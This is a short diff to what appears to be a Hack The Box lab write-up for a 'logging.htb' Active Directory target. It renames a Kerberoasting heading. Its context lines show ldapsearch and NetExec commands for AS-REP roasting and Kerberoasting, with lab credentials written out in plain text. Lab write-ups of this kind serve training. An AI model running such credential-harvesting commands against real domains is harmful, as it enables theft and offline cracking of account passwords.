@@ -35,7 +35,7 @@ ldapsearch -H ldap://logging.htb -x -b 'DC=logging,DC=htb' -D 'wallace.everette@
 ```shell
 nxc ldap 10.129.245.130 -u 'wallace.everette' -p 'Welcome2026@' --asreproast asreproastable.txt
 ```
-# 3. Kerberoasting
+# 3. Kerberoasting via LDAP
 ```shell
 nxc ldap 10.129.4.104 -u 'pentest' -p 'p3nt3st2025!&' --kerberoasting kerberoasting.txt
 ```
